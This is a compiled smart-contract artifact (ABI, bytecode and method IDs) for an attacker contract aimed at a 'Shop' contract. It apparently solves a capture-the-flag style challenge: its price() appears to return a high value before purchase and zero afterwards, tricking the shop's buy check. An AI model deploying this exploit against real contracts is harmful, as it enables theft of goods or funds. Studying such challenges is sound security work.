{"abi":[{"type":"constructor","inputs":[{"name":"shopAddress","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"price","inputs":[],"outputs":[{"name":"","type":"uint256","internalType":"uint256"}],"stateMutability":"view"},{"type":"function","name":"target","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract Shop"}],"stateMutability":"view"}],"bytecode":{"object":"0x60a0604052348015600e575f5ffd5b506040516102ba3803806102ba833981016040819052602b91603b565b6001600160a01b03166080526066565b5f60208284031215604a575f5ffd5b81516001600160a01b0381168114605f575f5ffd5b9392505050565b60805161023061008a5f395f8181606d0152818160b6015261013401526102305ff3fe608060405234801561000f575f5ffd5b506004361061003f575f3560e01c80639e5faafc14610043578063a035b1fe1461004d578063d4b8399214610068575b5f5ffd5b61004b6100b4565b005b610055610131565b6040519081526020015b60405180910390f35b61008f7f000000000000000000000000000000000000000000000000000000000000000081565b60405173ffffffffffffffffffffffffffffffffffffffff909116815260200161005f565b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663a6f2ae3a6040518163ffffffff1660e01b81526004015f604051808303815f87803b158015610119575f5ffd5b505af115801561012b573d5f5f3e3d5ffd5b50505050565b5f7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663e852e7416040518163ffffffff1660e01b8152600401602060405180830381865afa15801561019b573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906101bf91906101d4565b6101ca5760656101cc565b5f5b60ff16905090565b5f602082840312156101e4575f5ffd5b815180151581146101f3575f5ffd5b939250505056fea2646970667358221220abf6c30f9cb60e73881edc246563bdb4d6ca4191660bd65cb7272926b5e3bcf064736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","price()":"a035b1fe","target()":"d4b83992"},"id":0}